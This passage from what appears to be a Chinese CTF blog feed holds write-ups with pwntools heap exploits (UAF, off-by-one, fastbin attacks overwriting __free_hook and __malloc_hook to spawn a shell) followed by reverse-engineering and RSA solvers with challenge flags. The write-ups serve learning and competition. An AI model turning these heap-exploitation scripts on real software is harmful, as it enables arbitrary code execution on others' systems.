class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>)<span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;法诀内容: &#x27;</span>)</span><br><span class="line">heap=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))-<span class="number">0xa0a0a000660</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line">add(<span class="number">0x78</span>,p64(<span class="number">0x7777777777777777</span>)*<span class="number">6</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x78</span>,p64(<span class="number">0x7777777777777777</span>)*<span class="number">6</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x78</span>,p64(<span class="number">0x7777777777777777</span>)*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#r.interactive()</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;法诀序号: 3\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;法诀内容: &#x27;</span>)</span><br><span class="line">base=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">sys = base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">f_hook = base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">ma=base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">5</span>,p64(f_hook-<span class="number">8</span>)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(sys))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">delta=<span class="number">0x9e3779b9</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>re部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">int</span> *v, <span class="keyword">int</span> <span class="keyword">const</span> *key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> v1[<span class="number">3</span>]=&#123;<span class="number">200106999</span>,<span class="number">-740235093</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> v[<span class="number">3</span>]=&#123;<span class="number">-1374563276</span>,<span class="number">260139749</span>&#125;;</span><br><span class="line">   <span class="keyword">int</span> k[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>&#125;;</span><br><span class="line">	decipher(<span class="number">64</span>,v,k);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d  %d\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">	</span><br><span class="line">	decipher(<span class="number">64</span>,v1,k);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d  %d\n&quot;</span>,v1[<span class="number">0</span>],v1[<span class="number">1</span>]);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;pointSw0rd_point3v3ryth1ng&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>长城杯pwn1</title>
    <url>/2021/09/20/%E9%95%BF%E5%9F%8E%E6%9D%AFpwn1/</url>
    <content><![CDATA[<p>题目存在off by one 以及UAF漏洞</p>
<p>我们可以利用爆破</p>
<p>低字节修改到malloc-0x23</p>
<p>以及改变fastbin堆的fd指向unsortedbin堆</p>
<p>这样就能在下次申请的时候把这个unsortedbin拉进fastbin</p>
<p>我们只要改这个unsortedbin的fd指针就可以生效了，低字节修改到malloc-0x23。</p>
<p>再去利用off by one修改unsortedbin的大小为fastbin的大小</p>
<p>连续申请两次就可以在heaparry上得到libc的指针</p>
<p>接着再去把unsortedbin的fd改为0，bk改为__memalign_hook(在malloc-0x10上)</p>
<p>再去利用off by one 把unsortedbin大小复原</p>
<p>申请和unsortedbin大小一样的chunk去复原不然无法通过检测</p>
<p>最后利用onegadget打malloc_hook</p>
<p>利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># malloc不符合onegadget触发条件</span><br><span class="line"># malloc_printerr触发malloc_hook</span><br></pre></td></tr></table></figure>

<p>最后double的时候即可触发啦</p>
<span id="more"></span>



<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">libc_path = <span class="string">&#x27;/home/q/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">target_libc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ogg = [<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">rx = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">debug = <span class="keyword">lambda</span> : gdb.attach(p)</span><br><span class="line">shell = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;input context:\n&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;input index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	libc = ELF(libc_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(target[<span class="number">0</span>],target[<span class="number">1</span>])</span><br><span class="line">	libc = ELF(target_libc)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(rud(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">malloc_hook = base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">m_hook = malloc_hook&amp;<span class="number">0xff</span></span><br><span class="line">success(<span class="built_in">hex</span>(m_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;\xed\x1a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x70\x80&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)<span class="comment">#0 and 3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+<span class="string">&#x27;\x71&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)<span class="comment">#1 and 4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)<span class="comment">#malloc_hook-0x23</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+<span class="string">&#x27;\xf1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0xe0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">one = (base+ogg[<span class="number">0</span>])</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>+p8(one&amp;<span class="number">0xff</span>)+p8((one&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+p8((one&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">edit(<span class="number">5</span>,pl)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>逆向学习记录</title>
    <url>/2021/09/15/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>RE</p>
<span id="more"></span>



<h1 id="9月15日"><a href="#9月15日" class="headerlink" title="9月15日"></a>9月15日</h1><h2 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h2><p>题目打开</p>
<p>有getflag选项，懒得看直接ida打开32位，字符串看下</p>
<p>发现了这个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">INT_PTR __stdcall <span class="title">DialogFunc</span><span class="params">(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CHAR String[<span class="number">100</span>]; <span class="comment">// [esp+0h] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">272</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(String, Format, ++dword_4099F0);</span><br><span class="line">      <span class="keyword">if</span> ( dword_4099F0 == <span class="number">19999</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(String, <span class="string">&quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;</span>, <span class="number">19999</span>, <span class="number">0</span>);</span><br><span class="line">        SetWindowTextA(hWnd, String);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      SetWindowTextA(hWnd, String);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    EndDialog(hWnd, (<span class="keyword">unsigned</span> __int16)a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接出flag</p>
<p>BJD{1999902069a45792d233ac}</p>
<h2 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h2><p>这个是一道pyre，我们可以采用工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o attach.py attachment.pyc</span><br></pre></td></tr></table></figure>

<p>生成反编译python去查看</p>
<p>可以可以先将flag输入然后确保他在128范围内也就是(input1[i] + i) % 128</p>
<p>接着进行了flag长度的异或操作，并且给出了加密结果。</p>
<p>逆向就非常简单了，进行倒序异或，刚才第一步加了多少的i就减去多少的i</p>
<p>再去除以128即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.5.2 (default, Jan 26 2021, 13:30:48) </span></span><br><span class="line"><span class="comment"># [GCC 5.4.0 20160609]</span></span><br><span class="line"><span class="comment"># Embedded file name: encode.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2019-08-19 06:01:57</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[(i + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line">flag=[<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(code))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">	code[i]=<span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i])^<span class="built_in">ord</span>(code[(i+<span class="number">1</span>)]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">	flag[i]=(<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])-i)%<span class="number">128</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">str</span>(flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>给了一个公钥，以及一个pcg。</p>
<p>我们通过网站</p>
<p><a href="http://ctf.ssleye.com/pub_asys.html">http://ctf.ssleye.com/pub_asys.html</a></p>
<p>可以得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥类型RSA</span><br><span class="line">密钥强度256</span><br><span class="line">PN(e)65537</span><br><span class="line">PN(n)</span><br><span class="line">8693448229604811919066606200349480058890565601720302561721665405</span><br><span class="line">8378322103517</span><br><span class="line">DER格式</span><br><span class="line">303c300d06092a864886f70d0101010500032b003028022100c0332c5c64ae47182f6c1c876d42336910545a58f7eefefc0bcaaf5af341ccdd0203010001</span><br></pre></td></tr></table></figure>

<p>得到N可以再去网站</p>
<p><a href="http://www.factordb.com/">http://www.factordb.com</a></p>
<p>得到p q</p>
<p>最后exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"></span><br><span class="line">phin=(q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phin)</span><br><span class="line"></span><br><span class="line">key=rsa.PrivateKey(n,e,<span class="built_in">int</span>(d),p,q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f=f.read()</span><br><span class="line">flag=rsa.decrypt(f,key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h2><p>那到题目，我只能说IDA7.5非常不好用，改天换回ida7.0</p>
<p>ida7.5反汇编如下（加了UPX壳，直接去吾爱破解找upx3.6一键脱壳加壳神器）</p>
<p>就是因为这句qmemcpy(v4, “*F’&quot;N,&quot;(I?+@”, sizeof(v4));</p>
<p>卡了老半天，看别人ida7.0是非常明显的ASCII赋值，这样看就会非常明显有思路</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5[<span class="number">3</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">5</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">0x41</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v10 != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = v7;</span><br><span class="line">  v5[<span class="number">1</span>] = v8;</span><br><span class="line">  v5[<span class="number">2</span>] = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != _data_start__[*((<span class="keyword">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个加密方法挺简单的，就是根据你输入的字符串然后呢在去匹配加密密钥_data_start__</p>
<p>假设密钥是abcdefg，我明文是bg，密文就是27。同理给出了加密结果</p>
<p>qmemcpy(v4, “*F’&quot;N,&quot;(I?+@”, sizeof(v4));</p>
<p>只要用jio本匹配这些字符在的ascll在密钥中的位置所表示的字符再去输出出来就是明文了</p>
<p>exp如下</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">key = <span class="string">&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\&#x27;&amp;%$# !&quot;&#x27;</span> <span class="comment">#&#x27;一定要加\</span></span><br><span class="line">encrypt = [<span class="number">42</span>,<span class="number">70</span>,<span class="number">39</span>,<span class="number">34</span>,<span class="number">78</span>,<span class="number">44</span>,<span class="number">34</span>,<span class="number">40</span>,<span class="number">73</span>,<span class="number">63</span>,<span class="number">43</span>,<span class="number">64</span>]</span><br><span class="line">x = []</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encrypt:</span><br><span class="line">  x.append(key.find(<span class="built_in">chr</span>(i))+<span class="number">1</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">  flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span 